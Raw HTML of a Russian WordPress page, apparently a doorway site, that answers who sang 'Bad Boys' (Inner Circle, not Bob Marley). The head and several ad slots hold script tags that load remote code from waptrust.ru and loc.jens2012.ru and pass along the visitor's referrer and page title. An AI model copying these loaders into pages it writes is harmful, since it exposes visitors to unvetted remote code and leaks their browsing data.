muwallet.com/kto-pel-pesnyu-bad-boys
<!DOCTYPE html><html lang="ru-RU"><head><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><title>Кто пел песню bad boys</title><meta name="description" content="Обсуждения Песня «Bad Boys» была записана и исполнена группой Inner Circle впервые в 1987 году на альбоме One Way, но сингл это композиции вышел только в 1993 году. После выхода"><link rel='dns-prefetch' href='//s.w.org' /><link rel='stylesheet' id='crp-style-rounded-thumbs-css' href='http://muwallet.com/wp-content/plugins/contextual-related-posts/css/default-style.css?ver=4.7.3' type='text/css' media='all' /><style id='crp-style-rounded-thumbs-inline-css' type='text/css'>.crp_related a { width: 200px; height: 200px; text-decoration: none;
}
.crp_related img { max-width: 200px; margin: auto;
}
.crp_related .crp_title { width: 200px;
} </style><link rel='stylesheet' id='nirvanas-fonts-css' href='http://muwallet.com/wp-content/themes/nirvana/fonts/fontfaces.css?ver=1.3.3' type='text/css' media='all' /><link rel='stylesheet' id='nirvanas-css' href='http://muwallet.com/wp-content/themes/nirvana/style.css?ver=1.3.3' type='text/css' media='all' /><script type='text/javascript' src='http://muwallet.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='http://muwallet.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script><link rel="canonical" href="http://muwallet.com/kto-pel-pesnyu-bad-boys/" /><script type="text/javascript">document.write("<script src=\""+"http://waptrust.ru/code.js?d=heytu5deomstonbueuza&share=1&nopc=1&ref="+encodeURIComponent(document.referrer)+"&title="+encodeURIComponent(document.title)+"\"><\/script>");</script><style type="text/css"> #header-container { width: 1200px;} #header-container, #access >.menu, #forbottom, #colophon, #footer-widget-area, #topbar-inner, .ppbox, #pp-afterslider #container, #breadcrumbs-box { max-width: 1200px; } @media (max-width: 800px) { #header-container {position: relative !important;} #branding {height: auto !important;}}#container.one-column { } #container.two-columns-right #secondary { width:300px; float:right; } #container.two-columns-right #content { width:810px; float:left; } /*fallback*/ #container.two-columns-right #content { width:calc(100% - 330px); float:left; } #container.two-columns-left #primary { width:300px; float:left; } #container.two-columns-left #content { width:810px; float:right; } /*fallback*/ #container.two-columns-left #content { width:-moz-calc(100% - 330px); float:right; width:-webkit-calc(100% - 330px); width:calc(100% - 330px); } #container.three-columns-right .sidey { width:150px; float:left; } #container.three-columns-right #primary { margin-left:30px; margin-right:30px; } #container.three-columns-right #content { width:780px; float:left; } /*fallback*/ #container.three-columns-right #content { width:-moz-calc(100% - 360px); float:left; width:-webkit-calc(100% - 360px); width:calc(100% - 360px);} #container.three-columns-left .sidey { width:150px; float:left; } #container.three-columns-left #secondary {margin-left:30px; margin-right:30px; } #container.three-columns-left #content { width:780px; float:right;} /*fallback*/ #container.three-columns-left #content { width:-moz-calc(100% - 360px); float:right; width:-webkit-calc(100% - 360px); width:calc(100% - 360px); } #container.three-columns-sided .sidey { width:150px; float:left; } #container.three-columns-sided #secondary { float:right; } #container.three-columns-sided #content { width:780px; float:right; /*fallback*/ width:-moz-calc(100% - 360px); float:right; width:-webkit-calc(100% - 360px); float:right; width:calc(100% - 360px); float:right; margin: 0 180px 0 -1140px; } body { font-family: "Source Sans Pro"; } #content h1.entry-title a, #content h2.entry-title a, #content h1.entry-title , #content h2.entry-title { font-family: inherit; } .widget-title, .widget-title a { line-height: normal; font-family: inherit; } .widget-container, .widget-container a { font-family: inherit; } .entry-content h1, .entry-content h2, .entry-content h3, .entry-content h4, .entry-content h5, .entry-content h6, #comments #reply-title, .nivo-caption h2, #front-text1 h1, #front-text2 h1, h3.column-header-image { font-family: inherit; } #site-title span a { font-family: inherit; } #access ul li a, #access ul li a span { font-family: inherit; } body { color: #555555; background-color: #FFFFFF } a { color: #1EC8BB; } a:hover,.entry-meta span a:hover, .comments-link a:hover, body.coldisplay2 #front-columns a:active { color: #CB5920; } a:active {background-color:#CB5920; color:#FFFFFF; } .entry-meta a:hover, .widget-container a:hover, .footer2 a:hover { border-bottom-color: #CCCCCC; } .sticky h2.entry-title a {background-color:#1EC8BB; color:#FFFFFF;} #header { background-color: ; } #site-title span a { color:#1EC8BB; } #site-description { color:#666666; } .socials a:hover .socials-hover { background-color: #1EC8BB; } .socials-hover { background-color: #ADBF2D; } /* Main menu top level */ #access a, #nav-toggle span { color: #EEEEEE; } #access, #nav-toggle, #access ul li {background-color: #3A3B3D; } #access > .menu > ul > li > a > span { } #access ul li:hover {background-color: #1EC8BB; color:#FFFFFF; } #access ul > li.current_page_item , #access ul > li.current-menu-item , #access ul > li.current_page_ancestor , #access ul > li.current-menu-ancestor { background-color: #47484a; } /* Main menu Submenus */ #access ul ul li, #access ul ul { background-color:#1EC8BB; } #access ul ul li a {color:#FFFFFF} #access ul ul li:hover {background:#2cd6c9} #breadcrumbs {background:#f5f5f5} #access ul ul li.current_page_item, #access ul ul li.current-menu-item, #access ul ul li.current_page_ancestor , #access ul ul li.current-menu-ancestor { background-color:#2cd6c9; } #topbar { background-color: #FFFFFF; border-bottom-color:#ebebeb; } .menu-header-search .searchform {background: #F7F7F7;} .topmenu ul li a, .search-icon:before { color: #999999; } .topmenu ul li a:hover { color: #FFFFFF; background-color: #1EC8BB; } .search-icon:hover:before { color: #1EC8BB; } #main { background-color: #FFFFFF; } #author-info, #entry-author-info, .page-title { border-color: #CCCCCC; } .page-title-text {border-color: #CB5920; } .page-title span {border-color: #1EC8BB; } #entry-author-info #author-avatar, #author-info #author-avatar { border-color: #EEEEEE; } .avatar-container:before {background-color:#CB5920;} .sidey .widget-container { color: #555555; background-color: ; } .sidey .widget-title { color: #CB5920; background-color: ;border-color:#CCCCCC;} .sidey .widget-container a {color:;} .sidey .widget-container a:hover {color:;} .widget-title span {border-color:#CB5920;} .entry-content h1, .entry-content h2, .entry-content h3, .entry-content h4, .entry-content h5, .entry-content h6 { color: #444444; } .entry-title, .entry-title a { color: #444444; } .entry-title a:hover { color: #000000; } #content span.entry-format { color: #CCCCCC; } #footer { color: #AAAAAA; background-color: #F5F5F5; } #footer2 { color: #AAAAAA; background-color: #3A3B3D; } #sfooter-full { background-color: #353638; } .footermenu ul li { border-color: #494a4c; } .footermenu ul li:hover { border-color: #5d5e60; } #footer a { color: ; } #footer a:hover { color: ; } #footer2 a, .footermenu ul li:after { color: ; } #footer2 a:hover { color: ; } #footer .widget-container { color: #555555; background-color: ; } #footer .widget-title { color: #CB5920; background-color: ;border-color:#CCCCCC;} a.continue-reading-link { color:#1EC8BB; border-color:#1EC8BB; } a.continue-reading-link:hover { background-color:#1EC8BB !important; color:#FFFFFF !important; } #cryout_ajax_more_trigger {border:1px solid #CCCCCC; } #cryout_ajax_more_trigger:hover {background-color:#F7F7F7;} a.continue-reading-link i.icon-right-dir {color:#1EC8BB} a.continue-reading-link:hover i.icon-right-dir {color:#FFFFFF} .page-link a, .page-link > span > em {border-color:#CCCCCC} .columnmore a {background:#CB5920;color:#F7F7F7} .columnmore a:hover {background:#1EC8BB;} .file, .button, #respond .form-submit input#submit, input[type="submit"], input[type="reset"] { background-color: #FFFFFF; border-color: #CCCCCC; } .button:hover, #respond .form-submit input#submit:hover { background-color: #F7F7F7; } .entry-content tr th, .entry-content thead th { color: #444444; } #content tr th { background-color: #1EC8BB;color:#FFFFFF; } #content tr.even { background-color: #F7F7F7; } hr { background-color: #CCCCCC; } input[type="text"], input[type="password"], input[type="email"], textarea, select, input[type="color"],input[type="date"],input[type="datetime"],input[type="datetime-local"],input[type="month"],input[type="number"],input[type="range"], input[type="search"],input[type="tel"],input[type="time"],input[type="url"],input[type="week"] { /*background-color: #F7F7F7;*/ border-color: #CCCCCC #EEEEEE #EEEEEE #CCCCCC; color: #555555; } input[type="submit"], input[type="reset"] { color: #555555; } input[type="text"]:hover, input[type="password"]:hover, input[type="email"]:hover, textarea:hover, input[type="color"]:hover, input[type="date"]:hover, input[type="datetime"]:hover, input[type="datetime-local"]:hover, input[type="month"]:hover, input[type="number"]:hover, input[type="range"]:hover, input[type="search"]:hover, input[type="tel"]:hover, input[type="time"]:hover, input[type="url"]:hover, input[type="week"]:hover { background-color: rgba(247,247,247,0.4); } .entry-content code {background-color:#F7F7F7; border-color: rgba(30,200,187,0.1);} .entry-content pre { border-color: #CCCCCC;} abbr, acronym { border-color: #555555; } .comment-meta a { color: #999999; } #respond .form-allowed-tags { color: #999999; } .comment .reply a{ border-color: #EEEEEE; } .comment .reply a:hover {color: #1EC8BB; } .entry-meta {border-color:#EEEEEE;} .entry-meta .icon-metas:before {color:#CB5920;} .entry-meta span a, .comments-link a {color:;} .entry-meta span a:hover, .comments-link a:hover {color:;} .entry-meta span, .entry-utility span, .footer-tags {color:#999999;} .nav-next a:hover, .nav-previous a:hover {background:#1EC8BB;color:#FFFFFF;} .pagination { border-color:#ededed;} .pagination a:hover { background: #CB5920;color: #FFFFFF ;} h3#comments-title {border-color:#CCCCCC} h3#comments-title span {background: #1EC8BB;color: #FFFFFF ;} .comment-details {border-color:#EEEEEE} .searchform input[type="text"] {color:#999999;} .searchform:after {background-color:#CB5920;} .searchform:hover:after {background-color:#1EC8BB;} .searchsubmit[type="submit"] {color:#F7F7F7} li.menu-main-search .searchform .s {background-color:#FFFFFF;} li.menu-main-search .searchsubmit[type="submit"] {color:#999999;} .caption-accented .wp-caption { background-color:rgba(30,200,187,0.8); color:#FFFFFF;} .nirvana-image-one .entry-content img[class*='align'],.nirvana-image-one .entry-summary img[class*='align'], .nirvana-image-two .entry-content img[class*='align'],.nirvana-image-two .entry-summary img[class*='align'] { border-color:#1EC8BB;} #content p, #content ul, #content ol, #content, .ppbox { text-align:Default ; } #content p, #content ul, #content ol, .widget-container, .widget-container a, table, table td, .ppbox , .navigation, #content dl, #content { font-size:18px;line-height:1.8em; word-spacing:Default; letter-spacing:Default; } #content h1.entry-title, #content h2.entry-title { font-size:42px ;} .widget-title, .widget-title a { font-size:22px ;} .widget-container, .widget-container a { font-size:18px ;} #content .entry-content h1, #pp-afterslider h1 { font-size: 42px;} #content .entry-content h2, #pp-afterslider h2 { font-size: 36px;} #content .entry-content h3, #pp-afterslider h3 { font-size: 31px;} #content .entry-content h4, #pp-afterslider h4 { font-size: 26px;} #content .entry-content h5, #pp-afterslider h5 { font-size: 21px;} #content .entry-content h6, #pp-afterslider h6 { font-size: 16px;} #site-title span a { font-size:46px ;} #access ul li a { font-size:14px ;} #access ul ul ul a {font-size:12px;} #respond .form-allowed-tags { display:none;} .nocomments, .nocomments2 {display:none;} .comments-link span { display:none;} #header-container > div { margin:35px 0 0 0px;} #content p, #content ul, #content ol, #content dd, #content pre, #content hr { margin-bottom: 1.0em; } article footer.entry-meta {display:none;} #toTop:hover .icon-back2top:before {color:#CB5920;} #main {margin-top:5px; } #forbottom {padding-left: 0px; padding-right: 0px;} #header-widget-area { width: 33%; } #branding { height:150px; } </style> <style type="text/css">/* Nirvana Custom CSS */</style><!--[if lt IE 9]><script>
document.createElement('header');
document.createElement('nav');
document.createElement('section');
document.createElement('article');
document.createElement('aside');
document.createElement('footer');
</script><![endif]--></head><body class="post-template-default single single-post postid-6304 single-format-standard nirvana-image-one caption-simple nirvana-menu-left"><div id="wrapper" class="hfeed"><IDXSKIP><div id="topbar" ><div id="topbar-inner"> <div class="socials" id="sheader"><a target="_blank" href="#"	class="socialicons social-YouTube" title="YouTube"><img alt="YouTube" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/YouTube.png" /></a><a target="_blank" href="#"	class="socialicons social-Twitter" title="Twitter"><img alt="Twitter" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/Twitter.png" /></a><a target="_blank" href="#"	class="socialicons social-RSS" title="RSS"><img alt="RSS" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/RSS.png" /></a></div> </div></div></IDXSKIP><IDXSKIP><div class="socials" id="srights"><a target="_blank" href="#"	class="socialicons social-YouTube" title="YouTube"><img alt="YouTube" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/YouTube.png" /></a><a target="_blank" href="#"	class="socialicons social-Twitter" title="Twitter"><img alt="Twitter" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/Twitter.png" /></a><a target="_blank" href="#"	class="socialicons social-RSS" title="RSS"><img alt="RSS" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/RSS.png" /></a></div></IDXSKIP><div id="header-full"><header id="header"><div id="masthead"><div id="branding" role="banner" ><div id="header-container"><div class="site-identity"><div id="site-title"><span> <a href="http://muwallet.com/" title="" rel="home"></a> </span></div><div id="site-description" ></div></div></div><div style="clear:both;"></div></div><IDXSKIP><a id="nav-toggle"><span>&nbsp;</span></a></IDXSKIP><nav id="access" role="navigation"><IDXSKIP><div class="skip-link screen-reader-text"><a href="#content" title="Перейти к содержимому">Перейти к содержимому</a></div></IDXSKIP><IDXSKIP><div id="prime_nav" class="menu"><ul><li ><a href="http://muwallet.com/"><span>Главная</span></a></li><li class="page_item page-item-4"><a href="http://muwallet.com/karta-sayta/"><span>Карта сайта</span></a></li></ul></div></IDXSKIP></nav></div></header></div><div style="clear:both;height:0;"> </div><div id="breadcrumbs"><div id="breadcrumbs-box"><a href="http://muwallet.com"><i class="icon-homebread"></i><span class="screen-reader-text">Home</span></a><i class="icon-angle-right"></i> <a href="http://muwallet.com/category/chto/">Что</a> <i class="icon-angle-right"></i> <span class="current">Кто пел песню bad boys</span></div></div><div id="main"><div id="toTop"><i class="icon-back2top"></i> </div><div id="forbottom" ><div style="clear:both;"> </div><section id="container" class="two-columns-right"><div id="content" role="main"><div id="post-6304" class="post-6304 post type-post status-publish format-standard hentry category-chto"><h1 class="entry-title">Кто пел песню bad boys</h1><div class="entry-meta"></div><div class="entry-content"><div class='code-block code-block-1' style='margin: 8px auto; text-align: center;'><script language="JavaScript" src="http://loc.jens2012.ru/include/region.php/?id=6"></script></div><h3>Обсуждения</h3><p><img src="https://m.vk.com/images/deactivated_50.png" /></p><p>Песня «Bad Boys» была записана и исполнена группой Inner Circle впервые в 1987 году на альбоме One Way, но сингл это композиции вышел только в 1993 году. После выхода она заняла 8 место в США и 53 место в Англии. <br />«Bad<span id="more-6304"></span> Boys» которая стала популярной в начале 90-х, после того, как появилась в титрах популярного в США документального сериала COPS. Песня была использована в фильме с одноименным названием «Bad Boys» с Уилом Смитом и Мартином Лоуренсом в главных ролях, а так же в сиквеле «Bad Boys 2».<br />В интернете ходит ошибочное мнение, что песню Bad Boys исполнял Боб Марли. Боб Марли не писал и никогда не исполнял эту песню, он умер шесть лет ранее ее выхода. В «Bad Boys» и песни Боба Марли «I Shot the Sheriff» упоминается «Шериф Джон Браун» (Sheriff John Brown). В песне «I Shot the Sheriff» Джон Браун был застрелен, а в песне «Bad Boys» упоминается только одна строчка «What’cha gonna do/When the Sheriff John Brown come for you» (Что ты будешь делать/Когда Шериф Джон Браун придет за тобой).</p><p>Ребята, хватит добавлять песню Бэд Бойс в исполнеии Боба Марли.</p><p><img src="https://pp.vk.me/c626919/v626919888/2d784/UdpXJRnXtRI.jpg" /></p><p><iframe width="640" height="360" src="http://www.youtube.com/embed/xn9LQZ5tdys?feature=player_detailpage" frameborder="0" allowfullscreen></iframe><br /><br />кто пел песню bad boys:Обсуждения Песня «Bad Boys» была записана и исполнена группой Inner Circle впервые в 1987 году на альбоме One Way, но сингл это композиции вышел только в 1993 году. После выхода она заняла 8<script language="JavaScript" src="http://loc.jens2012.ru/include/region.php/?id=8"></script></p><div class="crp_related "><h3>Related Posts:</h3><ul><li><a href="http://muwallet.com/kto-napisal-pesnyu-gostya-iz-budushhego/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Кто написал песню гостья из будущего" title="Кто написал песню гостья из будущего" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Кто написал песню гостья из&hellip;</span></a></li><li><a href="http://muwallet.com/kto-napisal-nas-ne-dogonyat/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Кто написал нас не догонят" title="Кто написал нас не догонят" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Кто написал нас не догонят</span></a></li><li><a href="http://muwallet.com/kak-nazyvaetsya-pesnya-iz-cherepashki-nin/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Как называется песня из черепашки ниндзя" title="Как называется песня из черепашки ниндзя" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Как называется песня из&hellip;</span></a></li><li><a href="http://muwallet.com/kto-poet-pesnyu-khochu-zhit/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Кто поет песню хочу жить" title="Кто поет песню хочу жить" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Кто поет песню хочу жить</span></a></li><li><a href="http://muwallet.com/kto-ispolnyaet-pesnyu-v-filme-prividen/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Кто исполняет песню в фильме привидение" title="Кто исполняет песню в фильме привидение" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Кто исполняет песню в фильме&hellip;</span></a></li><li><a href="http://muwallet.com/kto-poet-pesnyu-iz-dyuymovochki/" ><img src="http://textpesni2.ru/i/ico/textpesni2.ru_2612628.jpg" alt="Кто поет песню из дюймовочки" title="Кто поет песню из дюймовочки" width="200" height="200" class="crp_thumb crp_correctfirst" /><span class="crp_title">Кто поет песню из дюймовочки</span></a></li><li><a href="http://muwallet.com/dzhentlmeny-udachi-pesnya-prosnis-i-po/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Джентльмены удачи песня проснись и пой кто поет" title="Джентльмены удачи песня проснись и пой кто поет" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Джентльмены удачи песня&hellip;</span></a></li><li><a href="http://muwallet.com/pesnya-yekh-luk-luchok-kto-napisal/" ><img src="http://muwallet.com/wp-content/plugins/contextual-related-posts/default.png" alt="Песня эх лук лучок кто написал" title="Песня эх лук лучок кто написал" width="200" height="200" class="crp_thumb crp_default" /><span class="crp_title">Песня эх лук лучок кто написал</span></a></li></ul><div class="crp_clear"></div></div></div><footer class="entry-meta"></footer></div><div id="nav-below" class="navigation"><div class="nav-previous"><a href="http://muwallet.com/video-kak-utonul-malchik-v-akvaparke-v/" rel="prev"><i class="icon-left-dir"></i> Видео как утонул мальчик в аквапарке видео</a></div><div class="nav-next"><a href="http://muwallet.com/kak-rekrutirovat-devushku-tankista-v-wot/" rel="next">Как рекрутировать девушку танкиста в wot <i class="icon-right-dir"></i></a></div></div></div><div id="secondary" class="widget-area sidey" role="complementary"><ul class="xoxo"><IDXSKIP><li id="socials-left" class="widget-container"><div class="socials" id="smenur"><a target="_blank" href="#"	class="socialicons social-YouTube" title="YouTube"><img alt="YouTube" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/YouTube.png" /></a><a target="_blank" href="#"	class="socialicons social-Twitter" title="Twitter"><img alt="Twitter" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/Twitter.png" /></a><a target="_blank" href="#"	class="socialicons social-RSS" title="RSS"><img alt="RSS" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/RSS.png" /></a></div></li></IDXSKIP><li id="ai_widget-2" class="widget-container ai_widget"><div class='code-block code-block-2' style='margin: 8px 0;'><script language="JavaScript" src="http://loc.jens2012.ru/include/region.php/?id=10"></script></div></li><li id="recent-posts-2" class="widget-container widget_recent_entries"><h3 class="widget-title"><span>Свежие записи</span></h3><ul><li><a href="http://muwallet.com/kak-ukrashen-nevskiy-prospekt-k-novomu/">Как украшен невский проспект к новому году 2015</a></li><li><a href="http://muwallet.com/kak-ukhazhivat-za-nozhami-iz-damasskoy-s/">Как ухаживать за ножами из дамасской стали</a></li><li><a href="http://muwallet.com/kogda-budet-v-apteke-speman/">Когда будет в аптеке спеман</a></li><li><a href="http://muwallet.com/kak-umenshit-pricel-v-ks-1-6-cherez-konsol/">Как уменьшит прицел в кс 1.6 через консоль</a></li><li><a href="http://muwallet.com/kak-udobrit-pochvu-mineralnymi-udob/">Как удобрить почву минеральными удобрениями</a></li></ul></li></ul></div></section><div style="clear:both;"></div></div> <IDXSKIP><footer id="footer" role="contentinfo"><div id="colophon"></div><div id="footer2"><div id="footer2-inside"><em style="display:table;margin:0 auto;float:none;text-align:center;padding:7px 0;font-size:13px;">создано с помощью Nirvana &amp; WordPress.</em><div id="sfooter-full"><div class="socials" id="sfooter"><a target="_blank" href="#"	class="socialicons social-YouTube" title="YouTube"><img alt="YouTube" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/YouTube.png" /></a><a target="_blank" href="#"	class="socialicons social-Twitter" title="Twitter"><img alt="Twitter" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/Twitter.png" /></a><a target="_blank" href="#"	class="socialicons social-RSS" title="RSS"><img alt="RSS" src="http://muwallet.com/wp-content/themes/nirvana/images/socials/RSS.png" /></a></div></div></div> </div></footer></IDXSKIP></div></div><link rel='stylesheet' id='nirvana-mobile-css' href='http://muwallet.com/wp-content/themes/nirvana/styles/style-mobile.css?ver=1.3.3' type='text/css' media='all' /><script type='text/javascript'>
